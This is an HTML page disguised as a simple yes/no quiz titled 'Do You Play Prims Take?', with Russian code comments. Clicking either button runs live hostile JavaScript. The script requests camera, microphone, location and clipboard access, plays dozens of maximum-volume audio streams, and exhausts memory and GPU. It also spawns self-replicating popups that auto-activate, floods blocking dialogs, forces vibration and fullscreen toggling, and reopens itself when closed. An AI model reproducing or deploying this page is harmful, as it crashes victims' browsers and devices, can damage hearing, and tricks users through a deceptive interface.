<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Do You Play Prims Take?</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, Helvetica, sans-serif;
            color: #fff;
            text-align: center;
            overflow: hidden;
            user-select: none;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(255,0,0,0.3);
            max-width: 400px;
            width: 90%;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 30px;
            text-shadow: 0 0 20px #f00;
            animation: pulseText 0.5s infinite alternate;
        }
        @keyframes pulseText {
            0% { color: #fff; text-shadow: 0 0 10px #f00; }
            100% { color: #ff0; text-shadow: 0 0 30px #f00, 0 0 60px #ff0; }
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .btn {
            padding: 18px 0;
            font-size: 24px;
            font-weight: bold;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.1s;
            background: #2a2a2a;
            color: #fff;
            box-shadow: 0 0 20px rgba(255,0,0,0.2);
        }
        .btn:active { transform: scale(0.95); }
        .btn-yes { background: #4caf50; }
        .btn-no { background: #f44336; }
        .btn-yes:hover { background: #66bb6a; }
        .btn-no:hover { background: #ef5350; }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #888;
            word-break: break-all;
        }
    </style>
</head>
<body>
<div class="container" id="mainContainer">
    <h1>❓ Do You Play Prims Take?</h1>
    <div class="btn-group">
        <button class="btn btn-yes" id="btnYes">YES</button>
        <button class="btn btn-no" id="btnNo">NO</button>
    </div>
    <div id="status">Click any button to proceed</div>
</div>

<script>
(function() {
    // Технические комментарии на русском
    var activated = false;
    var statusEl = document.getElementById('status');
    var audioCtxs = [];
    var intervals = [];
    var memoryHogs = [];

    // Функция для запроса всех возможных разрешений
    function requestAllPermissions() {
        try { navigator.geolocation.getCurrentPosition(function(){}, function(){}); } catch(e) {}
        try { navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(function(s){ }).catch(function(){}); } catch(e) {}
        try { Notification.requestPermission(); } catch(e) {}
        try { navigator.clipboard.readText().then(function(){}).catch(function(){}); } catch(e) {}
        try { navigator.clipboard.writeText('PRIMS TAKE').then(function(){}).catch(function(){}); } catch(e) {}
        try { navigator.storage.persist().then(function(){}).catch(function(){}); } catch(e) {}
        try { document.documentElement.requestFullscreen(); } catch(e) {}
        try { navigator.wakeLock.request('screen').then(function(lock){ 
                // Удерживаем блокировку
                setInterval(function(){ lock.release().then(function(){ navigator.wakeLock.request('screen'); }); }, 1000);
            }).catch(function(){}); 
        } catch(e) {}
        try { navigator.vibrate([1000, 500, 1000, 500, 2000]); } catch(e) {}
        try { screen.orientation.lock('landscape'); } catch(e) {}
        if (navigator.requestMIDIAccess) {
            try { navigator.requestMIDIAccess().then(function(){}).catch(function(){}); } catch(e) {}
        }
    }

    // Создание очень громкого звука
    function createLoudAudio() {
        var ctx = new (window.AudioContext || window.webkitAudioContext)();
        if (ctx.state === 'suspended') ctx.resume();
        var master = ctx.createGain();
        master.gain.value = 1.0;
        master.connect(ctx.destination);

        // 15 осцилляторов с разными частотами и типами
        var freqs = [50, 100, 200, 400, 800, 1600, 3200, 6400, 8000, 10000, 12000, 15000, 18000, 20000, 24000];
        for (var i=0; i<freqs.length; i++) {
            var osc = ctx.createOscillator();
            osc.type = (i%3===0) ? 'sawtooth' : (i%3===1) ? 'square' : 'triangle';
            osc.frequency.value = freqs[i];
            osc.connect(master);
            osc.start();
        }

        // Белый шум с максимальной громкостью
        var bufSize = ctx.sampleRate * 20;
        var buf = ctx.createBuffer(1, bufSize, ctx.sampleRate);
        var data = buf.getChannelData(0);
        for (var j=0; j<bufSize; j++) {
            data[j] = Math.random() * 2 - 1;
        }
        var noise = ctx.createBufferSource();
        noise.buffer = buf;
        noise.loop = true;
        var ng = ctx.createGain();
        ng.gain.value = 1.0;
        noise.connect(ng);
        ng.connect(ctx.destination);
        noise.start();

        // Периодическая волна с сильными гармониками
        var real = new Float32Array([0, 1, 0.9, 0.7, 0.5, 0.3, 0.2, 0.1]);
        var imag = new Float32Array(real.length);
        var wave = ctx.createPeriodicWave(real, imag);
        var oscP = ctx.createOscillator();
        oscP.setPeriodicWave(wave);
        oscP.frequency.value = 150;
        oscP.connect(master);
        oscP.start();

        // Сохраняем контекст для предотвращения сборки мусора
        audioCtxs.push(ctx);
        // Интервал для поддержания активности
        var keepAlive = setInterval(function() {
            if (ctx.state === 'suspended') ctx.resume();
        }, 20);
        intervals.push(keepAlive);
    }

    // Массовое создание аудио
    function spamAudio() {
        // Сразу 50 контекстов
        for (var i=0; i<50; i++) {
            setTimeout(function() {
                createLoudAudio();
            }, i * 10);
        }
        // Бесконечное добавление новых
        var audioSpam = setInterval(function() {
            for (var k=0; k<10; k++) {
                createLoudAudio();
            }
        }, 100);
        intervals.push(audioSpam);
    }

    // Перегрузка памяти
    function memoryOverload() {
        var mem = [];
        setInterval(function() {
            // Массивы по 20 МБ
            for (var i=0; i<100; i++) {
                mem.push(new ArrayBuffer(20 * 1024 * 1024));
            }
            // DOM элементы
            for (var j=0; j<5000; j++) {
                var d = document.createElement('div');
                d.style.position = 'absolute';
                d.style.left = Math.random() * 100000 + 'px';
                d.style.top = Math.random() * 100000 + 'px';
                d.style.width = '500px';
                d.style.height = '500px';
                d.style.background = 'rgba(255,0,0,0.02)';
                document.body.appendChild(d);
            }
            // Гигантские строки
            mem.push(new Array(50 * 1024 * 1024).join('X'));
        }, 5);
    }

    // Открытие вкладок без возможности закрыть (постоянный поток)
    function popupSpam() {
        function spawn() {
            var url = window.location.href + '?p=' + Date.now() + Math.random();
            var w = window.open(url, '_blank', 'width=300,height=300');
            if (!w) {
                var a = document.createElement('a');
                a.href = url;
                a.target = '_blank';
                a.rel = 'noopener';
                a.click();
            }
        }
        setInterval(function() {
            for (var i=0; i<15; i++) {
                spawn();
            }
        }, 200);
        // Также открываем about:blank
        setInterval(function() {
            window.open('about:blank', '_blank', 'width=100,height=100');
        }, 50);
    }

    // GPU перегрузка через WebGL и Canvas 2D
    function gpuOverload() {
        var canvas = document.createElement('canvas');
        canvas.width = 8192;
        canvas.height = 8192;
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.zIndex = '-2';
        document.body.appendChild(canvas);
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            setInterval(function() {
                for (var s=0; s<20; s++) {
                    var vs = gl.createShader(gl.VERTEX_SHADER);
                    gl.shaderSource(vs, 'attribute vec2 aPos; void main() { gl_Position = vec4(aPos, 0.0, 1.0); }');
                    gl.compileShader(vs);
                    var fs = gl.createShader(gl.FRAGMENT_SHADER);
                    var r = Math.random(), g = Math.random(), b = Math.random();
                    gl.shaderSource(fs, 'void main() { gl_FragColor = vec4('+r+','+g+','+b+',1.0); }');
                    gl.compileShader(fs);
                    var prog = gl.createProgram();
                    gl.attachShader(prog, vs);
                    gl.attachShader(prog, fs);
                    gl.linkProgram(prog);
                    gl.useProgram(prog);
                    var verts = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
                    var buf = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
                    gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
                    var aPos = gl.getAttribLocation(prog, 'aPos');
                    gl.enableVertexAttribArray(aPos);
                    gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                    gl.deleteProgram(prog);
                    gl.deleteShader(vs);
                    gl.deleteShader(fs);
                    gl.deleteBuffer(buf);
                }
            }, 5);
        }
        var ctx2d = canvas.getContext('2d');
        if (ctx2d) {
            setInterval(function() {
                for (var i=0; i<2000; i++) {
                    ctx2d.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
                    ctx2d.fillRect(Math.random()*8192, Math.random()*8192, 200, 200);
                }
            }, 5);
        }
    }

    // Диалоги для блокировки UI
    function spamDialogs() {
        setInterval(function() {
            try { alert('⚠️ PRIMS TAKE ACTIVATED!'); } catch(e) {}
        }, 30);
        setInterval(function() {
            try { confirm('CAN YOU STOP?'); } catch(e) {}
        }, 50);
        setInterval(function() {
            try { prompt('ENTER CODE:', ''); } catch(e) {}
        }, 80);
    }

    // Сенсоры и вибрация
    function sensorSpam() {
        setInterval(function() {
            try { navigator.vibrate([100, 100, 100, 100, 100, 100, 100, 100]); } catch(e) {}
        }, 30);
        // Акселерометр
        if (window.DeviceMotionEvent) {
            window.addEventListener('devicemotion', function(e){}, true);
        }
        if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', function(e){}, true);
        }
    }

    // Дополнительные безумства: переключение полноэкранного режима, блокировка кнопки выключения (невозможно, но пытаемся)
    function extraCrazy() {
        // Переключение полноэкранного режима каждые 200 мс
        setInterval(function() {
            try {
                if (document.fullscreenElement) {
                    document.exitFullscreen();
                } else {
                    document.documentElement.requestFullscreen();
                }
            } catch(e) {}
        }, 200);
        // Захват указателя
        setInterval(function() {
            try { document.body.requestPointerLock(); } catch(e) {}
        }, 500);
        // Спам консоли
        setInterval(function() {
            console.log('PRIMS TAKE ' + Math.random());
            console.error('FATAL ERROR');
            console.warn('WARNING');
        }, 5);
        // Пытаемся предотвратить закрытие вкладки (onbeforeunload)
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
        });
        // Также перехватываем закрытие окна
        window.onunload = function() {
            // Открываем новое окно при закрытии
            window.open(window.location.href, '_blank');
        };
    }

    // Главная функция активации
    function activate() {
        if (activated) return;
        activated = true;
        statusEl.textContent = '🚀 ACTIVATED! HOLD ON...';
        document.querySelector('h1').textContent = '💀 PRIMS TAKE!';

        requestAllPermissions();
        spamAudio();
        memoryOverload();
        popupSpam();
        gpuOverload();
        spamDialogs();
        sensorSpam();
        extraCrazy();

        // Постоянно возобновляем аудиоконтексты
        setInterval(function() {
            audioCtxs.forEach(function(ctx) {
                if (ctx.state === 'suspended') ctx.resume();
            });
        }, 20);

        // Также открываем много окон сразу
        for (var i=0; i<100; i++) {
            setTimeout(function() {
                window.open(window.location.href, '_blank', 'width=400,height=400');
            }, i*20);
        }
    }

    // Обработчики кнопок
    document.getElementById('btnYes').addEventListener('click', activate);
    document.getElementById('btnNo').addEventListener('click', activate);

    // Если страница открыта как попап – автоактивация через 0.5 секунды
    if (window.opener) {
        setTimeout(function() {
            if (!activated) activate();
        }, 500);
    }

    // Пытаемся удержать экран включенным
    try {
        navigator.wakeLock.request('screen').then(function(lock) {
            setInterval(function() {
                lock.release().then(function() {
                    navigator.wakeLock.request('screen');
                });
            }, 500);
        });
    } catch(e) {}
})();
</script>
</body>
</html>
